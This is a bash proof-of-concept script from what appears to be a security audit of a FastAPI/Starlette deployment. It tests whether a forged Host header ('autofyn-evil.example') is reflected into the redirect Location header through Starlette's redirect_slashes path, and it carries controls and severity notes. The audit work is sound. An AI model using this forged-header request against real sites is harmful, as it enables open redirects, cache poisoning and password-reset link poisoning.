#!/usr/bin/env bash
# poc_09_host_header_open_redirect.sh — Host-header injection → open redirect
# via Starlette's redirect_slashes path.
#
# ── Sink ─────────────────────────────────────────────────────────────────────
#   starlette/routing.py:695-706 (Router.__call__, FastAPI's APIRouter inherits):
#     line 695: if scope["type"]=="http" and self.redirect_slashes and route_path!="/":
#     lines 696-700: build redirect_scope with path's trailing slash toggled.
#     line 705:  redirect_url = URL(scope=redirect_scope)
#     line 706:  response = RedirectResponse(url=str(redirect_url))
#                → emits Location: http://<netloc>/<path>/
#
#   starlette/datastructures.py:43-50,60 (URL(scope=...)):
#     line 43-50: host_header extracted from scope["headers"];
#                 _HOST_RE fullmatch (line 49) → netloc = host_header (line 50)
#     line 60:   SplitResult(scheme, netloc, path, ...).geturl() → full URL
#
# ── Source / data flow ───────────────────────────────────────────────────────
#   Host: autofyn-evil.example  (attacker-controlled HTTP request header)
#     → scope["headers"]  (passed directly into ASGI; NO proxy/middleware needed)
#     → starlette/routing.py:695  redirect_slashes branch (FastAPI default True)
#     → starlette/routing.py:705  URL(scope=redirect_scope)
#     → starlette/datastructures.py:50  netloc = "autofyn-evil.example"
#     → starlette/routing.py:706  RedirectResponse(url="http://autofyn-evil.example/items/")
#     → Location: http://autofyn-evil.example/items/
#
# ── Precondition (PROMINENT — do NOT overstate exploitability) ────────────────
#   Exploitable when:
#     (1) The app has at least one route reachable via redirect (e.g. /items/
#         registered; requested as /items) — very common pattern.
#     (2) redirect_slashes=True (FastAPI default — fastapi/routing.py:1788).
#     (3) No TrustedHostMiddleware filtering the Host header.
#
#   NO proxy, NO ASGI middleware required for the redirect itself.
#   Unlike poc_07/poc_08, this is exploitable against a plain uvicorn deployment
#   (Host header is attacker-controlled in any HTTP client).
#
#   Meaningful exploitation for cache/link poisoning additionally requires an
#   upstream cache or proxy that forwards an arbitrary Host to the origin. For
#   the redirect itself — plain HTTP connection is sufficient.
#
# ── PASS/FAIL semantics (FINDING check — SAME convention as poc_07/poc_08) ───
#   poc_09 is a FINDING check (opposite of the defensive poc_01–06):
#     FAIL = attacker Host appears as Location netloc = CONFIRMED injection finding.
#     PASS = Location uses the real host / attacker marker absent = defense held.
#   THIS POC IS EXPECTED TO FAIL ON THIS COMMIT.
#   A FAIL from this PoC is the correct, valid audit output — it is NOT a
#   harness bug.  run_all.sh prints "REAL FINDING DETECTED" on FAIL, which is
#   the intended behavior for a confirmed security finding.
#
# ── Detection logic ───────────────────────────────────────────────────────────
#   Attacker Host: autofyn-evil.example  (bare hostname — required by _HOST_RE)
#   _HOST_RE (datastructures.py:25): ^([a-z0-9.-]+|\[...\])(?::[0-9]+)?$
#   "autofyn-evil.example" matches [a-z0-9.-]+ → netloc accepted → reflected.
#   Do NOT use //autofyn-evil.example (poc_08 payload) — _HOST_RE rejects /,
#   falls through to netloc=None (datastructures.py:56), Host NOT reflected.
#
#   Assertion order (non-vacuous — mirrors poc_08 control structure):
#     1. Positive control: GET /items/ (trailing slash, default Host) → HTTP 200
#        (route exists and serves). Precondition for the redirect target.
#     2. Teeth-test / negative control: GET /items (no slash, real Host) →
#        assert 3xx AND Location does NOT contain attacker marker.
#        Proves netloc is genuinely Host-driven (non-vacuous baseline).
#     3. Exploit + CR-guard: GET /items with Host: autofyn-evil.example.
#        Parse status from captured header block. If NOT 3xx → redirect_slashes
#        did not fire → precondition not met → FAIL + exit.
#     4. Finding judgment: from the same exploit response, grep the header block
#        for Location containing //autofyn-evil.example.
#        If found → FAIL (confirmed finding); else → PASS (defense held).
#
# ── Independence from poc_07/poc_08 ─────────────────────────────────────────
#   poc_07 source: X-Forwarded-Prefix → root_path  sink: docs.py:168  class: XSS
#   poc_08 source: X-Forwarded-Prefix → root_path  sink: applications.py:1114  class: server-URL hijack
#   poc_09 source: Host header (no proxy)            sink: routing.py:706  class: open redirect
#   poc_09 shares NO source with poc_07/poc_08 — genuinely independent on all three axes
#   (source, sink, attack class). TrustedHostMiddleware fixes poc_09 but NOT poc_07/08.
#   Fixing root_path escaping (poc_07/08 fix) does NOT fix poc_09.
#
# ── Severity ─────────────────────────────────────────────────────────────────
#   LOW-to-MEDIUM (conditional).
#   In a browser a script cannot control the victim's Host header — the classic
#   click-through open redirect is limited. Real impact: web-cache poisoning,
#   password-reset / email-link poisoning, phishing pivot when an upstream
#   cache or proxy forwards an arbitrary Host to the origin.
#   Inherited from Starlette's routing.py (redirect_slashes=True by FastAPI
#   default). NOT fork-planted.
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# shellcheck source=../lib/pins.sh
source "${SCRIPT_DIR}/../lib/pins.sh"
# shellcheck source=../lib/common.sh
source "${SCRIPT_DIR}/../lib/common.sh"

BASE_URL="${1:?Base URL required as \$1}"
ITEMS_SLASH_URL="${BASE_URL}/items/"
ITEMS_URL="${BASE_URL}/items"

echo "=== poc_09: Host-header injection → open redirect via redirect_slashes (starlette/routing.py:706) ==="
echo "Sink        : starlette/routing.py:706 — RedirectResponse(url=str(redirect_url))"
echo "Source      : Host request header (no proxy/middleware needed)"
echo "Precondition: redirect_slashes=True (FastAPI default); /items/ route registered; no TrustedHostMiddleware"
echo "Payload     : Host: autofyn-evil.example"
echo "Expected    : FAIL (attacker host in Location netloc = real finding)"
echo ""

PASS=1

# ── Positive control ──────────────────────────────────────────────────────────
# Confirms /items/ (the trailing-slash route) serves HTTP 200.
# Without this route the redirect target does not exist; the positive control
# proves the redirect_slashes branch will find a matching route to redirect to.
echo "--- Positive control: GET /items/ (trailing slash, default Host) ---"
PC_CODE="$(curl -sS -o /tmp/poc09_pc.txt -w "%{http_code}" \
    --max-time 10 \
    "${ITEMS_SLASH_URL}" 2>&1 || echo "000")"
echo "HTTP ${PC_CODE}"

if [[ "$PC_CODE" != "200" ]]; then
    echo "[FAIL] Positive control: /items/ returned HTTP ${PC_CODE} — route missing or broken"
    print_check "host_header_open_redirect" "FAIL" \
        "positive control failed — /items/ route missing (HTTP ${PC_CODE}); cannot assess Host-header injection"
    exit 0
fi
echo "[OK] Positive control: /items/ returned 200 — trailing-slash route exists"
echo ""

# ── Teeth-test / negative control ────────────────────────────────────────────
# GET /items with NO forged Host header (real host from BASE_URL).
# Asserts:
#   (a) Response is a 3xx redirect (redirect_slashes fires with real host).
#   (b) Location does NOT contain "autofyn-evil.example" (marker absent without
#       the forged header — non-vacuous baseline).
# Primary assertion is marker ABSENCE; real-host string is env-dependent (may be
# an IP:port) so we do NOT hard-assert its exact value.
echo "--- Teeth-test (negative control): GET /items with real Host — marker must be absent from Location ---"
curl -sS -i --max-time 10 -o /tmp/poc09_neg.txt "${ITEMS_URL}" 2>&1 || true
NEG_HEADERS="$(awk '/^\r?$/{exit} {print}' /tmp/poc09_neg.txt 2>/dev/null || echo "")"
NEG_STATUS="$(printf '%s\n' "${NEG_HEADERS}" | grep -m1 -iE '^HTTP/' | awk '{print $2}')"
echo "HTTP ${NEG_STATUS:-???}"

# Check marker absent from Location
if assert_not_contains "${NEG_HEADERS}" "autofyn-evil.example"; then
    echo "[OK] Teeth-test: 'autofyn-evil.example' absent from Location with real Host — non-vacuous baseline confirmed"
else
    echo "[ERROR] Attacker marker 'autofyn-evil.example' found in Location WITHOUT forged Host header."
    echo "        This indicates harness contamination or test state pollution."
    print_check "host_header_open_redirect" "FAIL" \
        "marker present in Location without forged Host — test contaminated; cannot assess"
    exit 0
fi

# Informational: confirm redirect fires at all with real host (non-blocking)
if [[ -n "${NEG_STATUS}" ]] && [[ "${NEG_STATUS}" =~ ^3 ]]; then
    echo "[OK] Teeth-test: redirect_slashes fired (HTTP ${NEG_STATUS}) with real Host — confirms redirect branch is active"
else
    echo "[INFO] Teeth-test: status ${NEG_STATUS:-???} — redirect_slashes may not have fired with real Host; continuing"
fi
echo ""

# ── Exploit request (used for both CR-guard and finding judgment) ─────────────
# Sends Host: autofyn-evil.example (bare hostname — required by _HOST_RE).
# Captures full raw headers with -i; does NOT follow redirects (no -L).
echo "--- Exploit: GET /items with Host: autofyn-evil.example (no -L, headers captured) ---"
curl -sS -i --max-time 10 \
    -H "Host: autofyn-evil.example" \
    -o /tmp/poc09_atk.txt \
    "${ITEMS_URL}" 2>&1 || true
# Extract header block (everything before the first blank line)
ATK_HEADERS="$(awk '/^\r?$/{exit} {print}' /tmp/poc09_atk.txt 2>/dev/null || echo "")"
# Parse status code from the HTTP status line in the captured headers
ATK_STATUS="$(printf '%s\n' "${ATK_HEADERS}" | grep -m1 -iE '^HTTP/' | awk '{print $2}')"
echo "HTTP ${ATK_STATUS:-???}"
echo ""

# ── CR-guard ──────────────────────────────────────────────────────────────────
# Status parsed from the captured header block above (no re-request needed).
# If NOT a 3xx, redirect_slashes did not fire → precondition not met.
if [[ -z "${ATK_STATUS}" ]] || ! [[ "${ATK_STATUS}" =~ ^3 ]]; then
    echo "[ERROR] Response to GET /items with forged Host was NOT a 3xx redirect (got: ${ATK_STATUS:-none})."
    echo "        redirect_slashes did not fire — precondition not met (route/path mismatch or redirect disabled)."
    echo "        This is a harness/configuration failure — NOT a defense pass."
    print_check "host_header_open_redirect" "FAIL" \
        "redirect_slashes did not fire (HTTP ${ATK_STATUS:-none}) — precondition not met; route or config mismatch"
    exit 0
fi
echo "[OK] CR-guard: redirect_slashes fired (HTTP ${ATK_STATUS}) with forged Host — proceeding to finding judgment"
echo ""

# ── Finding judgment ──────────────────────────────────────────────────────────
# Grep the header block (before first blank line) for a Location: line containing
# //autofyn-evil.example.  Matching on the header block only (not body) ensures
# we are targeting the actual Location sink (routing.py:706), not a reflected body.
# Case-insensitive match for Location field name; specific substring for the value.
echo "--- Finding judgment: check for '//autofyn-evil.example' in Location header ---"
LOCATION_LINE="$(printf '%s\n' "${ATK_HEADERS}" | grep -iE '^location:' || true)"
echo "Location header: ${LOCATION_LINE:-<not found>}"

if assert_contains "${LOCATION_LINE}" "//autofyn-evil.example"; then
    echo "[FAIL] Location header contains attacker-controlled hostname 'autofyn-evil.example'."
    echo "       Host: request header flows unvalidated into Location response header."
    echo "       Sink: starlette/routing.py:706 (RedirectResponse(url=str(redirect_url)))"
    echo "       URL built at routing.py:705 from redirect_scope; netloc = Host header value"
    echo "       via datastructures.py:43-50 (_HOST_RE validates only syntax, not content)."
    echo "       Enabled by FastAPI default redirect_slashes=True (fastapi/routing.py:1788)."
    echo "       Impact: open redirect / Host-header injection — web-cache poisoning,"
    echo "               password-reset link poisoning, phishing pivot."
    print_check "host_header_open_redirect" "FAIL" \
        "Host header reflected into Location netloc at starlette/routing.py:706; source=Host header (no proxy needed); sink=Location response header; open redirect confirmed; LOW-MEDIUM finding under redirect_slashes=True (FastAPI default)"
else
    echo "[OK] Attacker hostname NOT found in Location netloc — Host header not reflected into Location."
    echo "     Either TrustedHostMiddleware is active or redirect_slashes URL construction was fixed."
    print_check "host_header_open_redirect" "PASS" \
        "Host header not reflected into Location netloc — defense held (starlette/routing.py:706)"
fi
